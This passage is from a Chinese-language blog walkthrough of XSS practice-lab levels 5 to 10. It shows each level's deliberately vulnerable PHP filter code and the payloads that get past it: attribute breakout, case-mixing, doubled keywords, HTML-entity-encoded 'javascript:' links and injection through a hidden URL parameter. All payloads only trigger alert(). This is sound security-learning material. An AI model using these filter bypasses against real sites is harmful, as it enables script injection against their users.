class="hljs-string">center</span>&gt;</span>没有找到和finish<span class="hljs-symbol">&amp;quot;</span> onfocus=javascript:alert(&#x27;xss&#x27;) <span class="hljs-symbol">&amp;quot;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;finish&quot;</span> <span class="hljs-attr">o_nfocus</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;) &quot;&quot;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level5.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:42<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
<p>onfocus 里 on 变成 o_n 了。<br>onfocus<br>去docker里看了一眼源码：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level5&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str3</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>依旧没有转义input里的str，那尝试构造：  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;&quot; &gt;&lt;a href=javascript:alert()&gt;HIHI&lt;/a&gt; &lt;&quot;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>成功</p>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>可以通过大小写绕过on和er的转义：<br>payload:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot; &gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hRef</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>HIHI<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;&#x27;<br></code></pre></td></tr></table></figure>

<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>随便填个payload，然后查看页面源码。  </p>
<p>发现这次是直接吧关键词过滤了，大小写绕不过了；   </p>
<p>联想到sql注入类似的场景，双写试一下？  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;&quot; &gt;&lt;a hrhrefef=javascript:alert()&gt;HIHI&lt;/a&gt; &lt;&quot;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>成功了，但是点击不了，换一条payload看看呢：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&quot; oonnfocus=javascript:alert(&#x27;XSS&#x27;) &quot;</span><br></code></pre></td></tr></table></figure>
<p>成功！  </p>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>这里多了个添加友情连接，大概就是输入插入里面，源码看一下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;&lt;!--<span class="hljs-variable constant_">STATUS</span> <span class="hljs-variable constant_">OK</span>--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;script&gt;<br>window.alert = function()  <br>&#123;     <br>confirm(&quot;完成的不错！&quot;);<br> window.location.href=&quot;level9.php?keyword=not bad!&quot;; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level8&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;<br>&lt;center&gt;<br>&lt;form action=level8.php method=GET&gt;<br>&lt;input name=keyword  value=&quot;finish&amp;quot; oonnfocus=javascript:alert(&#x27;xss&#x27;) &amp;quot;&quot;&gt;<br>&lt;input type=submit name=submit value=添加友情链接 /&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;finish&amp;quot oo_nnfocus=javascr_ipt:alert(&#x27;xss&#x27;) &amp;quot&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payload的长度:53&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>强制转化为小写并且全部转义。。。    </p>
<p>忍不住看来网上的wp，说是href会自动编译自己链接里的unioncode，  </p>
<p>但🈶又问了一下ai：  </p>
<p><strong>在 HTML 中，href 属性本身不会“编译” Unicode，但浏览器在解析 HTML 和处理 URL 时，会按照标准对 Unicode 字符进行编码和解码。这可能会让你产生“自动编译”的错觉。</strong></p>
<p>然后🈶又找了一下，发现并不是浏览器解析unioncode的原因，是href会解析html实体的原因  </p>
<p>能通过将payload编译为html的十进制或十六进制实体来进行绕过：   </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#41;</span><br></code></pre></td></tr></table></figure>
<p>这段在赛博厨子里自动识别为：HTML Entity<br>所以说并不是unioncode</p>
<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>上一关的payload就直接被band了。。。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><br>&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;&lt;!--<span class="hljs-variable constant_">STATUS</span> <span class="hljs-variable constant_">OK</span>--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;script&gt;<br>window.alert = function()  <br>&#123;     <br>confirm(&quot;完成的不错！&quot;);<br> window.location.href=&quot;level10.php?keyword=well done!&quot;; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level9&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;<br>&lt;center&gt;<br>&lt;form action=level9.php method=GET&gt;<br>&lt;input name=keyword  value=&quot;&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#41;&quot;&gt;<br>&lt;input type=submit name=submit value=添加友情链接 /&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payload的长度:101&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>只能去看源码了吗  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level10.php?keyword=well done!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level9&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">&#x27;http://&#x27;</span>))<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>        &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str7</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>我们必须让输入包含 http:&#x2F;&#x2F;，否则不会把我们的输入插入到 href 中！  </p>
<p>这样的话，使用内联注释付 &#x2F;**&#x2F;,在sql中也常用作空格绕过<br>payload:  </p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">41</span>;<span class="hljs-comment">/*http://*/</span><br></code></pre></td></tr></table></figure>

<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>这关的注入点在url上<br>看网上wp，有其他传参参数？  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level11.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level10&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>“t_sort”就过滤了尖括号而已，还是上网找了答案：</p>
<p>playlaod:</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">t_sort</span>=<span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure>

<p>这样源码就变成了：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level11.php?keyword=good job!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level10<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level10<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">javascript:alert()</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level10.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span 